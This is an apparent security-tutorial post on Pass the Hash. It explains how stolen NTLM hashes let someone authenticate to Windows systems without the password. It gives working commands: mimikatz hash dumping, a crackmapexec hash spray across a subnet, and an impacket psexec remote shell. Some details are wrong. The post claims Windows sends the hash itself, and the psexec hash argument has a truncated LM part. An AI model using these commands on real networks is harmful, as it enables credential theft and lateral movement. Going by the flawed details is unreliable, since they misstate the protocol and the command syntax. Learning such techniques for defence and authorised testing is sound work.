# Day 17 - Pass the Hash

## What It Is
Pass the Hash (PtH) is an attack where an attacker uses a stolen NTLM password hash to authenticate to a system without knowing or cracking the actual plaintext password. Windows authentication protocols accept the hash directly as proof of identity — so if you have the hash, you have access. It turns hash dumping from a stepping stone into a final destination.

## How It Works
Windows uses NTLM hashes for authentication in many scenarios — local logins, network shares, remote desktop, and more. When you log in, Windows doesn't send your plaintext password — it sends the NTLM hash as the credential. An attacker who steals that hash can replay it to authenticate as that user anywhere the hash is accepted.

Attack flow:
1. Attacker gains initial access to a Windows machine (any method)
2. Dumps NTLM hashes from memory using mimikatz or from the SAM database
3. Takes the hash — no cracking needed
4. Uses the hash directly to authenticate to other systems on the network
5. Moves laterally across the entire domain if an admin hash is obtained

```bash
# Step 1 - dump hashes from memory with mimikatz (run as admin/SYSTEM)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# output shows something like:
# Username: Administrator
# NTLM: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Step 2 - use the hash to authenticate (format is LM:NTLM)
# with crackmapexec
crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# with impacket psexec - get a shell on remote machine
psexec.py Administrator@192.168.1.10 -hashes aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
